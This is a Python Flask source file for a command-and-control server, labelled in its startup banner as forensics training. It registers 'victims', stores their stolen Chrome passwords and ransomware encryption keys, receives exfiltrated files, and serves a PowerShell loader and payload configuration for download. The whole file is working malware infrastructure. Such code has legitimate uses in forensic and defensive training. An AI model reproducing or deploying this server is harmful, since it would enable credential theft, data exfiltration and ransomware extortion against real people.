#!/usr/bin/env python3
from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime
import json
import os

app = Flask(__name__, static_folder='website', static_url_path='')

LOG_DIR = "logs"
DATA_DIR = "exfiltrated_data"
KEYS_DIR = "encryption_keys"
PASSWORDS_DIR = "stolen_passwords"

for directory in [LOG_DIR, DATA_DIR, KEYS_DIR, PASSWORDS_DIR]:
    os.makedirs(directory, exist_ok=True)

def log_request(endpoint, data):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = {
        "timestamp": timestamp,
        "endpoint": endpoint,
        "remote_addr": request.remote_addr,
        "data": data
    }
    
    log_file = os.path.join(LOG_DIR, f"c2_{datetime.now().strftime('%Y%m%d')}.json")
    with open(log_file, "a") as f:
        f.write(json.dumps(log_entry) + "\n")
    
    print(f"[{timestamp}] {endpoint} from {request.remote_addr}")
    return log_entry

@app.route('/')
def index():
    return send_from_directory('website', 'index.html')

@app.route('/register', methods=['POST'])
def register():
    try:
        data = request.get_json()
        victim_id = data.get('victim_id', 'unknown')
        
        print("=" * 70)
        print(f" NEW VICTIM: {victim_id}")
        print(f"   Host: {data.get('hostname')}")
        print(f"   User: {data.get('username')}")
        print(f"   IP: {request.remote_addr}")
        print(f"   Chrome PWDs: {len(data.get('chrome_passwords', []))}")
        print("=" * 70)
        
        log_request('/register', data)
        
        victim_file = os.path.join(DATA_DIR, f"{victim_id}_info.json")
        with open(victim_file, "w") as f:
            json.dump(data, f, indent=2)
        
        if 'encryption_key' in data:
            key_file = os.path.join(KEYS_DIR, f"{victim_id}_key.txt")
            with open(key_file, "w") as f:
                f.write(f"Victim: {victim_id}\n")
                f.write(f"Key: {data['encryption_key']}\n")
            print(f"Key saved")
        
        if data.get('chrome_passwords'):
            pwd_file = os.path.join(PASSWORDS_DIR, f"{victim_id}_passwords.json")
            with open(pwd_file, "w") as f:
                json.dump(data.get('chrome_passwords', []), f, indent=2)
            print(f" Passwords saved")
        
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        print(f" Error: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/exfiltrate', methods=['POST'])
def exfiltrate():
    try:
        data = request.get_json()
        victim_id = data.get('victim_id', 'unknown')
        
        print("=" * 70)
        print(f" EXFILTRATION: {victim_id}")
        print(f"   Files: {data.get('count', 0)}")
        print("=" * 70)
        
        log_request('/exfiltrate', data)
        
        files_file = os.path.join(DATA_DIR, f"{victim_id}_files.json")
        with open(files_file, "w") as f:
            json.dump(data, f, indent=2)
        
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        print(f" Error: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/health')
def health():
    return jsonify({"status": "online", "server": "192.168.74.147:8080"}), 200

@app.route('/config.dat')
def config():
    try:
        return send_from_directory('payloads', 'config.dat')
    except:
        return jsonify({"error": "Not found"}), 404

@app.route('/loader.ps1')
def loader():
    try:
        return send_from_directory('website', 'loader.ps1')
    except:
        return jsonify({"error": "Not found"}), 404

if __name__ == '__main__':
    print("=" * 70)
    print(" C2 SERVER - FORENSICS TRAINING")
    print("=" * 70)
    print(f"IP: 192.168.74.147:8080")
    print("=" * 70)
    print("Waiting...\n")
    
    app.run(host='0.0.0.0', port=8080, debug=False)


